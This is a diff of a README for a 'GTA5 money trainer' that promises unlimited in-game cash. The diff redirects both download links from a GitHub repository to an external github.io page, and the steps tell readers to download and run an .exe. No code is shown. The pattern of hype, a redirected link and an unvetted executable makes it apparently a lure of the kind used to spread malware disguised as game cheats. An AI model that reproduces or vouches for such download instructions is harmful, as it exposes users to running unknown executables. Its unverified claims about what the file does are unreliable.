@@ -1,6 +1,6 @@
 # 💰 gta5-money-trainer-2026 - Earn unlimited in-game cash instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Rianecedarn141/gta5-money-trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://rianecedarn141.github.io)
 
 ## 📋 About the application
 This tool modifies local game data to grant unlimited in-game cash for your driving game. It works as a standalone trainer for Windows users. The software handles memory offsets to adjust your bank balance. It operates locally on your machine. You do not need to edit game files manually. This tool performs the requested task without altering core game assets or textures. 
@@ -16,7 +16,7 @@ Ensure your computer meets these standards to run the software:
 ## 📥 Downloading the software
 Follow these steps to acquire the tool:
 
-1. Visit this page to download: [https://github.com/Rianecedarn141/gta5-money-trainer-2026](https://github.com/Rianecedarn141/gta5-money-trainer-2026)
+1. Visit this page to download: [https://rianecedarn141.github.io](https://rianecedarn141.github.io)
 2. Locate the latest release on the right side of the screen.
 3. Click the link that ends in .exe to save the file to your computer.
 4. Move the file to your desktop for easy access.
